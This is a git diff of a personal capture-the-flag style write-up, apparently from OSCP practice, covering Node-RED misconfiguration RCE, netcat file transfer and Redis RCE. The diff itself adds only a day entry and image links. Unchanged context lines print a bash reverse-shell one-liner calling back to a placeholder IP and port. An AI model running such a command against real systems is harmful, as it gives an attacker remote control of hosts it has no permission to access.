@@ -47,6 +47,7 @@ I would have notice the key, but not found it.. I know
 Day 1 : `ab68fb463e681b499d99226ce92e12e9`
 Day 2: returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
 Day 3: After along time away: `695613754dfef3f53a0b18b02d805047`
+Day 4: After some practice elsewhere
 
 [Node-RED](https://nodered.org/about/)is a program tools visually displaying and interactable function of a program in chart.
 
@@ -63,10 +64,11 @@ TCP reply to! This is misconfiguration vulnerablity as we are affectively RCE th
 
 ![shell](shell.png)
 
-
 `bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`
 
 Even though I like ncat and netcat, I am glad to finally be prompted to use it as a file transfer mechanism instead of other tools. Similar to trying out powercat it felt fun, but also gratting a tad as I always see it on Enumeration Script scans after I run it.. but I don't check its there before file transfering.
+
+![](noexecshm.png)
 
 
 WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets!
@@ -167,6 +169,7 @@ I am sure I have done this Redis RCE on THM, but I want to read to hammer the RE
 Before reading the exploitation of Redis without metasploit. Tunnelling to get to that Redis database is 
 
 ![](excellent.png)
+
 
 [Reading](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) this database RCE involves write file to the file system by putting out file into Redis server memory and then transfering it.
 ```bash
